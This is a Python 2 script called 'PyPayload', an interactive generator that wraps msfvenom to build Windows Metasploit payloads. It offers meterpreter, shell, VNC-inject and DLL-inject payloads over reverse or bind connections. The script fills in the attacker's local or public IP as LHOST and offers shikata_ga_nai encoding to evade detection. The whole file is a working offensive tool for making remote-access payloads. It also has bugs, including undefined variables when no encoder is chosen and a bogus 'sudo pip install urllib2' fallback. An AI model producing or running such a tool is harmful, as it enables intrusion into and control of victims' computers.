import sys, platform, os, socket
from itertools import chain

from subprocess import call

try:
	from urllib2 import urlopen
except ImportError:
	os.system("sudo pip install urllib2")

# Bold
BR = "\033[1;31m"         # Red
BG = "\033[1;32m"       # Green
BY = "\033[1;33m"      # Yellow
BB = "\033[1;34m"        # Blue
BP = "\033[1;35m"      # Purple
BC = "\033[1;36m"        # Cyan
BW = "\033[1;37m"       # White

# Regular Colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green					# Variables for text colors. Saves me the trouble thank you!
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


header = C + """ ______     ______           _                 _ 
 | ___ \    | ___ \         | |               | |
 | |_/ /   _| |_/ /_ _ _   _| | ___   __ _  __| |
 |  __/ | | |  __/ _` | | | | |/ _ \ / _` |/ _` |
 | |  | |_| | | | (_| | |_| | | (_) | (_| | (_| |
 \_|   \__, \_|  \__,_|\__, |_|\___/ \__,_|\__,_|
        __/ |           __/ |                    
       |___/           |___/                     """ + W


def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('google.com', 0))
	localaddr = s.getsockname()[0] # local subnet
	ipaddr = urlopen('http://ip.42.pl/raw').read() # public IP
	return (ipaddr, localaddr)

def concatenate(*lists):
    new_list = []
    for i in lists:
        new_list.extend(i)
    return new_list

print header

print G + "\n[*] Automatic Metasploit Payload Generator [*]\n" + P
print "You are currently using " + O + str(platform.system()) + " " + str(platform.release()) + W + "\nLoading..." 

if str(platform.system()) != "Linux":
	print BR + "[!] You are not using a Linux-based operating system! [!]" +  W

try:
    call(["msfvenom"], stderr=open(os.devnull, 'wb'))
except OSError as e:
    print BR + "[!] Msfvenom is not found! Please set appropriate paths or install Metasploit if not installed! [!] " + W
    sys.exit(1)

payload_array = ["reverse_tcp", "bind_tcp", "reverse_http", "reverse_https"]
payload_type = ["meterpreter", "shell", "vncinject", "dllinject", ]
payload_os = ["windows"]

while True:
	payload = raw_input( BB + "[>] Specify a payload! Press enter to see a list of available payload options, or enter your desired one now: " + W )
	if payload == "":
		for o in payload_os:
			for t in payload_type:
				for a in payload_array:
					name = o + "/" + t + "/" + a
					print BW + name
	else:
		Payload = payload
		print "Payload => " + payload
		break


(ipaddr, localaddr) = get_ip()

print "[*] Select option or manually enter [*]"
print "-------------------------------------------------------------"
print C + "(1) Use default local subnet address: " + O + localaddr + C
print "(2) Use public IP address: " + O + ipaddr + W
print "-------------------------------------------------------------"
op1 = raw_input(BB + "[>] What is your LHOST? " + W )
if op1 == "1":
    LHOST = localaddr
elif op1 == "2":
    LHOST = ipaddr
else:
    LHOST = op1

print "LHOST => " + LHOST

op2 = raw_input(BB + "[>] What is your LPORT? (enter for 4444 default) " + W )
if op2 == "":
    LPORT = "4444"
else:
	LPORT = op2
print "LPORT => " + LPORT


op3 = raw_input(BB + "[>] Are you using an encoder? (y/n) " + W )
if op3 == "y":
    op4 = raw_input(BB + "[>] Name of encoder? (enter for x86/shikata_ga_nai default) " + W )
    if op4 == "":
        Encoder = "x86/shikata_ga_nai"
    else:
        Encoder = op4
    op5 = raw_input(BB + "[>] How many iterations? " + W )
    print "Encoder => " + Encoder
    print "Iterations => " + op5
elif op3 == "n":
    print BY + "No encoder selected!" + W
else:
    print R + """Whoops something went wrong! I'm guessing that's a "no" then. """ + W

op6 = raw_input(BB + "[>] What is the fileformat you would like the payload in? (enter for exe default) " + W )
if op6 == "":
    Fileformat = "exe";
else:
    Fileformat = op6
print "Fileformat => " + Fileformat

op7 = raw_input(BB + "[>] Any additional options you would like to supply? (y/n) " + W )
if op7 == "y":
    ops = raw_input(BB + "[>] Please input additional flags as you would when utilizing msfvenom (for e.g -f exe)  " + W )
    print "Additional options => " + ops
elif op7 == "n":
    ops = " "

op8 = raw_input(BB + "[>] What is the name of the payload? " + W )

if "dllinject" in payload:
    dllpath = raw_input("[>] Additional option required: Specify path to reflective DLL script: ")
    print "DLLpath => " + dllpath
    print BG + "[*] Creating payload ... [*]"
    with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
        call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "DLL={}".format(dllpath), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)

print BG + "[*] Creating payload ... [*]" + W
with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
    call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)
